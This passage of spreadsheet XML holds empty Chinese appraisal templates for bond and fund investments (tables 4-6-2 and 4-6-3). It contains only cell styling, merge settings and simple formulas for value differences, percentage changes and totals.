    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="380" t="n"/>
      <c r="E26" s="578" t="n"/>
      <c r="F26" s="233" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555">
        <f>J26-H26</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>IF(H26=0,"",K26/H26*100)</f>
        <v/>
      </c>
      <c r="M26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="380" t="n"/>
      <c r="E27" s="578" t="n"/>
      <c r="F27" s="233" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555">
        <f>J27-H27</f>
        <v/>
      </c>
      <c r="L27" s="555">
        <f>IF(H27=0,"",K27/H27*100)</f>
        <v/>
      </c>
      <c r="M27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="380" t="n"/>
      <c r="E28" s="578" t="n"/>
      <c r="F28" s="233" t="n"/>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555" t="n"/>
      <c r="I28" s="555" t="n"/>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555">
        <f>J28-H28</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>IF(H28=0,"",K28/H28*100)</f>
        <v/>
      </c>
      <c r="M28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合          计</t>
        </is>
      </c>
      <c r="C29" s="567" t="n"/>
      <c r="D29" s="383" t="n"/>
      <c r="E29" s="115" t="n"/>
      <c r="F29" s="380" t="n"/>
      <c r="G29" s="555">
        <f>ROUND(SUM(G6:G28),2)</f>
        <v/>
      </c>
      <c r="H29" s="555">
        <f>ROUND(SUM(H6:H28),2)</f>
        <v/>
      </c>
      <c r="I29" s="555" t="n"/>
      <c r="J29" s="555">
        <f>ROUND(SUM(J6:J28),2)</f>
        <v/>
      </c>
      <c r="K29" s="555">
        <f>J29-H29</f>
        <v/>
      </c>
      <c r="L29" s="555">
        <f>IF(H29=0,"",K29/H29*100)</f>
        <v/>
      </c>
      <c r="M29" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="L3:M3"/>
    <mergeCell ref="B2:M2"/>
    <mergeCell ref="B29:C29"/>
    <mergeCell ref="B1:M1"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:M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4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 codeName="Sheet48">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:M29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A28"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="15.5" customWidth="1" style="410" min="1" max="1"/>
    <col width="13.6666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="18.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="9" customWidth="1" style="410" min="4" max="4"/>
    <col width="10.5" customWidth="1" style="410" min="5" max="5"/>
    <col width="10" customWidth="1" style="410" min="6" max="6"/>
    <col width="9" customWidth="1" style="410" min="7" max="7"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="8" max="9"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="10" max="11"/>
    <col outlineLevel="1" width="10.5" customWidth="1" style="410" min="12" max="12"/>
    <col width="7.66666666666667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其他非流动金融资产—债券投资评估明细表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402" t="inlineStr">
        <is>
          <t>表4-6-2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176" t="n"/>
      <c r="M4" s="176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被投资单位名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>债券名称</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>发行日期</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>投资日期</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>票面利率%</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>成本</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>账面价值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Height="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="380" t="n"/>
      <c r="E6" s="578" t="n"/>
      <c r="F6" s="578" t="n"/>
      <c r="G6" s="380" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555">
        <f>J6-I6</f>
        <v/>
      </c>
      <c r="L6" s="555">
        <f>IF(I6=0,"",K6/I6*100)</f>
        <v/>
      </c>
      <c r="M6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="578" t="n"/>
      <c r="F7" s="578" t="n"/>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555">
        <f>J7-I7</f>
        <v/>
      </c>
      <c r="L7" s="555">
        <f>IF(I7=0,"",K7/I7*100)</f>
        <v/>
      </c>
      <c r="M7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="578" t="n"/>
      <c r="F8" s="578" t="n"/>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555">
        <f>J8-I8</f>
        <v/>
      </c>
      <c r="L8" s="555">
        <f>IF(I8=0,"",K8/I8*100)</f>
        <v/>
      </c>
      <c r="M8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="578" t="n"/>
      <c r="F9" s="578" t="n"/>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555">
        <f>J9-I9</f>
        <v/>
      </c>
      <c r="L9" s="555">
        <f>IF(I9=0,"",K9/I9*100)</f>
        <v/>
      </c>
      <c r="M9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="380" t="n"/>
      <c r="E10" s="578" t="n"/>
      <c r="F10" s="578" t="n"/>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555">
        <f>J10-I10</f>
        <v/>
      </c>
      <c r="L10" s="555">
        <f>IF(I10=0,"",K10/I10*100)</f>
        <v/>
      </c>
      <c r="M10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="380" t="n"/>
      <c r="E11" s="578" t="n"/>
      <c r="F11" s="578" t="n"/>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555">
        <f>J11-I11</f>
        <v/>
      </c>
      <c r="L11" s="555">
        <f>IF(I11=0,"",K11/I11*100)</f>
        <v/>
      </c>
      <c r="M11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="380" t="n"/>
      <c r="E12" s="578" t="n"/>
      <c r="F12" s="578" t="n"/>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555">
        <f>J12-I12</f>
        <v/>
      </c>
      <c r="L12" s="555">
        <f>IF(I12=0,"",K12/I12*100)</f>
        <v/>
      </c>
      <c r="M12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="380" t="n"/>
      <c r="E13" s="578" t="n"/>
      <c r="F13" s="578" t="n"/>
      <c r="G13" s="380" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555">
        <f>J13-I13</f>
        <v/>
      </c>
      <c r="L13" s="555">
        <f>IF(I13=0,"",K13/I13*100)</f>
        <v/>
      </c>
      <c r="M13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="380" t="n"/>
      <c r="E14" s="578" t="n"/>
      <c r="F14" s="578" t="n"/>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555">
        <f>J14-I14</f>
        <v/>
      </c>
      <c r="L14" s="555">
        <f>IF(I14=0,"",K14/I14*100)</f>
        <v/>
      </c>
      <c r="M14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="380" t="n"/>
      <c r="E15" s="578" t="n"/>
      <c r="F15" s="578" t="n"/>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555">
        <f>J15-I15</f>
        <v/>
      </c>
      <c r="L15" s="555">
        <f>IF(I15=0,"",K15/I15*100)</f>
        <v/>
      </c>
      <c r="M15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="380" t="n"/>
      <c r="E16" s="578" t="n"/>
      <c r="F16" s="578" t="n"/>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555">
        <f>J16-I16</f>
        <v/>
      </c>
      <c r="L16" s="555">
        <f>IF(I16=0,"",K16/I16*100)</f>
        <v/>
      </c>
      <c r="M16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="380" t="n"/>
      <c r="E17" s="578" t="n"/>
      <c r="F17" s="578" t="n"/>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555">
        <f>J17-I17</f>
        <v/>
      </c>
      <c r="L17" s="555">
        <f>IF(I17=0,"",K17/I17*100)</f>
        <v/>
      </c>
      <c r="M17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="380" t="n"/>
      <c r="E18" s="578" t="n"/>
      <c r="F18" s="578" t="n"/>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555">
        <f>J18-I18</f>
        <v/>
      </c>
      <c r="L18" s="555">
        <f>IF(I18=0,"",K18/I18*100)</f>
        <v/>
      </c>
      <c r="M18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="578" t="n"/>
      <c r="F19" s="578" t="n"/>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555">
        <f>J19-I19</f>
        <v/>
      </c>
      <c r="L19" s="555">
        <f>IF(I19=0,"",K19/I19*100)</f>
        <v/>
      </c>
      <c r="M19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="578" t="n"/>
      <c r="F20" s="578" t="n"/>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555">
        <f>J20-I20</f>
        <v/>
      </c>
      <c r="L20" s="555">
        <f>IF(I20=0,"",K20/I20*100)</f>
        <v/>
      </c>
      <c r="M20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="578" t="n"/>
      <c r="F21" s="578" t="n"/>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555">
        <f>J21-I21</f>
        <v/>
      </c>
      <c r="L21" s="555">
        <f>IF(I21=0,"",K21/I21*100)</f>
        <v/>
      </c>
      <c r="M21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="578" t="n"/>
      <c r="F22" s="578" t="n"/>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555">
        <f>J22-I22</f>
        <v/>
      </c>
      <c r="L22" s="555">
        <f>IF(I22=0,"",K22/I22*100)</f>
        <v/>
      </c>
      <c r="M22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="578" t="n"/>
      <c r="F23" s="578" t="n"/>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555">
        <f>J23-I23</f>
        <v/>
      </c>
      <c r="L23" s="555">
        <f>IF(I23=0,"",K23/I23*100)</f>
        <v/>
      </c>
      <c r="M23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="380" t="n"/>
      <c r="E24" s="578" t="n"/>
      <c r="F24" s="578" t="n"/>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555">
        <f>J24-I24</f>
        <v/>
      </c>
      <c r="L24" s="555">
        <f>IF(I24=0,"",K24/I24*100)</f>
        <v/>
      </c>
      <c r="M24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="578" t="n"/>
      <c r="F25" s="578" t="n"/>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555">
        <f>J25-I25</f>
        <v/>
      </c>
      <c r="L25" s="555">
        <f>IF(I25=0,"",K25/I25*100)</f>
        <v/>
      </c>
      <c r="M25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="380" t="n"/>
      <c r="E26" s="578" t="n"/>
      <c r="F26" s="578" t="n"/>
      <c r="G26" s="380" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555">
        <f>J26-I26</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>IF(I26=0,"",K26/I26*100)</f>
        <v/>
      </c>
      <c r="M26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="380" t="n"/>
      <c r="E27" s="578" t="n"/>
      <c r="F27" s="578" t="n"/>
      <c r="G27" s="380" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555">
        <f>J27-I27</f>
        <v/>
      </c>
      <c r="L27" s="555">
        <f>IF(I27=0,"",K27/I27*100)</f>
        <v/>
      </c>
      <c r="M27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="380" t="n"/>
      <c r="E28" s="578" t="n"/>
      <c r="F28" s="578" t="n"/>
      <c r="G28" s="380" t="n"/>
      <c r="H28" s="555" t="n"/>
      <c r="I28" s="555" t="n"/>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555">
        <f>J28-I28</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>IF(I28=0,"",K28/I28*100)</f>
        <v/>
      </c>
      <c r="M28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customHeight="1" s="415">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合          计</t>
        </is>
      </c>
      <c r="C29" s="567" t="n"/>
      <c r="D29" s="383" t="n"/>
      <c r="E29" s="115" t="n"/>
      <c r="F29" s="115" t="n"/>
      <c r="G29" s="383" t="n"/>
      <c r="H29" s="555">
        <f>ROUND(SUM(H6:H28),2)</f>
        <v/>
      </c>
      <c r="I29" s="555">
        <f>ROUND(SUM(I6:I28),2)</f>
        <v/>
      </c>
      <c r="J29" s="555">
        <f>ROUND(SUM(J6:J28),2)</f>
        <v/>
      </c>
      <c r="K29" s="555">
        <f>J29-I29</f>
        <v/>
      </c>
      <c r="L29" s="555">
        <f>IF(I29=0,"",K29/I29*100)</f>
        <v/>
      </c>
      <c r="M29" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="L3:M3"/>
    <mergeCell ref="B2:M2"/>
    <mergeCell ref="B29:C29"/>
    <mergeCell ref="B1:M1"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:M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0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 codeName="Sheet49">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:M31"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A30"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="15.3333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="8.5" customWidth="1" style="410" min="2" max="2"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="10.8333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="9.16666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="12" customWidth="1" style="410" min="6" max="6"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="7" max="9"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="10" max="11"/>
    <col outlineLevel="1" width="8.16666666666667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其他非流动金融资产—基金投资评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="14" customHeight="1" s="415">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="14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402" t="inlineStr">
        <is>
          <t>表4-6-3</t>
        </is>
      </c>
    </row>
    <row r="4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176" t="n"/>
      <c r="M4" s="176">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" customForma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基金发行单位</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>基金名称</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>基金类型</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>投资日期</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>成本</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>基准日净值/份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s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="380" t="n"/>
      <c r="E6" s="380" t="n"/>
      <c r="F6" s="578" t="n"/>
      <c r="G6" s="555" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555">
        <f>J6-H6</f>
        <v/>
      </c>
      <c r="L6" s="555">
        <f>IF(H6=0,"",K6/H6*100)</f>
        <v/>
      </c>
      <c r="M6" s="383" t="n"/>
    </row>
    <row r="7" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="380" t="n"/>
      <c r="F7" s="578" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555">
        <f>J7-H7</f>
        <v/>
      </c>
      <c r="L7" s="555">
        <f>IF(H7=0,"",K7/H7*100)</f>
        <v/>
      </c>
      <c r="M7" s="383" t="n"/>
    </row>
    <row r="8" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="578" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555">
        <f>J8-H8</f>
        <v/>
      </c>
      <c r="L8" s="555">
        <f>IF(H8=0,"",K8/H8*100)</f>
        <v/>
      </c>
      <c r="M8" s="383" t="n"/>
    </row>
    <row r="9" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="578" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555">
        <f>J9-H9</f>
        <v/>
      </c>
      <c r="L9" s="555">
        <f>IF(H9=0,"",K9/H9*100)</f>
        <v/>
      </c>
      <c r="M9" s="383" t="n"/>
    </row>
    <row r="10" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="380" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="578" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555">
        <f>J10-H10</f>
        <v/>
      </c>
      <c r="L10" s="555">
        <f>IF(H10=0,"",K10/H10*100)</f>
        <v/>
      </c>
      <c r="M10" s="383" t="n"/>
    </row>
    <row r="11" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="380" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="578" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555">
        <f>J11-H11</f>
        <v/>
      </c>
      <c r="L11" s="555">
        <f>IF(H11=0,"",K11/H11*100)</f>
        <v/>
      </c>
      <c r="M11" s="383" t="n"/>
    </row>
    <row r="12" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="380" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="578" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555">
        <f>J12-H12</f>
        <v/>
      </c>
      <c r="L12" s="555">
        <f>IF(H12=0,"",K12/H12*100)</f>
        <v/>
      </c>
      <c r="M12" s="383" t="n"/>
    </row>
    <row r="13" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="380" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="578" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555">
        <f>J13-H13</f>
        <v/>
      </c>
      <c r="L13" s="555">
        <f>IF(H13=0,"",K13/H13*100)</f>
        <v/>
      </c>
      <c r="M13" s="383" t="n"/>
    </row>
    <row r="14" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="380" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="578" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555">
        <f>J14-H14</f>
        <v/>
      </c>
      <c r="L14" s="555">
        <f>IF(H14=0,"",K14/H14*100)</f>
        <v/>
      </c>
      <c r="M14" s="383" t="n"/>
    </row>
    <row r="15" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="380" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="578" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555">
        <f>J15-H15</f>
        <v/>
      </c>
      <c r="L15" s="555">
        <f>IF(H15=0,"",K15/H15*100)</f>
        <v/>
      </c>
      <c r="M15" s="383" t="n"/>
    </row>
    <row r="16" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="380" t="n"/>
